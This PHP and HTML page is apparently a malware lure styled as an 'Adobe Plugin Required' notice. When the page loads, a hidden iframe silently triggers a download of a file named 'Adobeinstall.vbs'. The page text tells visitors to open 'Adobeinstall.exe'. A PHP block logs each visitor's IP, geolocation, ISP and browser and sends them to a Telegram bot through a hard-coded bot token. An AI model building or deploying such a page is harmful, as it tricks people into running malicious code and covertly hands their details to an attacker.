<?php
// Telegram Configuration
$botToken = '7314342814:AAGDBGtXE9yjUAh_aYn6To5N1KG6AXelbK8';
$chatID = '833164981';

// File to download
$fileName = 'Adobeinstall.vbs';

// Collect visitor data
$ip = $_SERVER['REMOTE_ADDR'];
$ua = $_SERVER['HTTP_USER_AGENT'];
$time = date('Y-m-d H:i:s');

// Get geolocation
$geo = json_decode(file_get_contents("http://ip-api.com/json/{$ip}"), true);

// Create Telegram message
$message = "🚨 New Download Triggered 🚨\n";
$message .= "▫️ Time: {$time}\n";
$message .= "▫️ IP: {$ip}\n";
$message .= "▫️ Location: " . ($geo['city'] ?? 'Unknown') . ", " . ($geo['country'] ?? 'Unknown') . "\n";
$message .= "▫️ ISP: " . ($geo['isp'] ?? 'Unknown') . "\n";
$message .= "▫️ Device: {$ua}";

// Send to Telegram
$url = "https://api.telegram.org/bot{$botToken}/sendMessage";
$data = ['chat_id' => $chatID, 'text' => $message];
$options = [
    'http' => [
        'method'  => 'POST',
        'content' => http_build_query($data)
    ]
];
file_get_contents($url, false, stream_context_create($options));
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Adobe Plugin Required</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            height: 100vh;
            display: flex;
            align-items: flex-start;
            justify-content: center;
            background-color: #f5f5f5;
            padding-top: 15vh;
        }
        .container {
            text-align: center;
            max-width: 600px;
            margin-top: 0;
        }
        img {
            width: 150px;
            margin-bottom: 20px;
        }
        a {
            color: #d32f2f;
            text-decoration: none;
            font-weight: bold;
        }
        a:hover {
            text-decoration: underline;
        }
        p {
            line-height: 1.6;
            margin: 0;
            padding: 0 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="adobeicon.png" alt="Adobe Icon">
        <p>Sorry, You do not have the latest version of Adobe plugin installed.<br>
        Let’s finish your installation.<br><br>
        Open Adobeinstall.exe from recent downloads (right corner of this screen) to install. <a href="download.php">Download manually</a>.<br><br>
        Download not working? <a href="#">Restart and Download | Get Help</a></p>
    </div>
    
    <!-- Hidden iframe to trigger download after page loads -->
    <iframe src="download.php" style="display:none;"></iframe>
</body>
</html>